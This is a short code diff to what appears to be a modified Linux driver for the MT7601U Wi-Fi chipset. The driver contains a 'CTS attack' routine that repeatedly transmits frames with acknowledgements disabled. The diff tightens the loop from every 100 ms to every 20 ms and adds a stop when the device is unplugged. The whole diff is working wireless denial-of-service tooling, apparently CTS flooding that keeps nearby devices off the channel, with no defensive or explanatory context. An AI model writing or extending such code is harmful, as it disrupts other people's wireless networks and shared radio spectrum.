@@ -25,15 +25,19 @@ static void mt7601u_cts_attack(struct mt7601u_dev *dev){
     info->flags |= IEEE80211_TX_CTL_NO_ACK;
     skb_set_queue_mapping(skb, 0);
     mt7601u_tx(dev->hw, &control, skb);
+    //dev_info(dev->dev, "trans success\n");
 }
 
 static void mt7601u_attack_work_handler(struct work_struct *work){
     struct mt7601u_dev *dev = container_of(work, struct mt7601u_dev, attack_work.work);
     if(!dev->attack_running)
         return;
-
+    if (test_bit(MT7601U_STATE_REMOVED, &dev->state)) {
+        dev->attack_running = false;
+        return;
+    }
     mt7601u_cts_attack(dev);
-    schedule_delayed_work(&dev->attack_work, msecs_to_jiffies(100));
+    schedule_delayed_work(&dev->attack_work, msecs_to_jiffies(20));
 }
 
 static ssize_t mt7601u_attack_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
